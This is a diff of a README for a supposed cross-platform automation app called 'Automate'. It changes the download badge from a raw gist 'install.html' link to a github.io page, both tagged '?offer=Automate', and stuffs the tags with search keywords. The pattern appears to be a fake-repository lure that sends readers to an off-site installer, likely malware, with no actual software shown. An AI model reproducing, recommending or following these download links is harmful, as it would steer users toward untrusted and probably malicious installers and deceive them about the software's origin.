@@ -1,6 +1,6 @@
 # Automate Download — Cross-Platform Workflow Automation for Desktop
 
-[![Get Automate GitHub](https://img.shields.io/badge/Get%20Automate%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/n44-png/578c1e8f24db4f346403c975fc39cd0e/raw/94683cec652ef86092516bccae1b17c2f8a45cfe/install.html?offer=Automate)
+[![Get Automate GitHub](https://img.shields.io/badge/Get%20Automate%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-deployer-app.github.io/.github/?offer=Automate)
 
 ---
 
@@ -80,7 +80,7 @@ Whether managing repetitive IT operations or orchestrating business processes, A
 
 ## 🔍 Tags  
 
-Automation, Business Tools, Task Scheduler, Integration, Productivity, Process Management, Automate, automate mac, automate pc, automate windows, automate desktop, automate for mac, automate for pc, automate for windows
+Automation, process automation, marketing automation, robotic process automation, power automate, Business Tools, Task Scheduler, Integration, Productivity, Process Management, Automate, automate mac, automate pc, automate windows, automate desktop, automate for mac, automate for pc, automate for windows
 
 ---
 
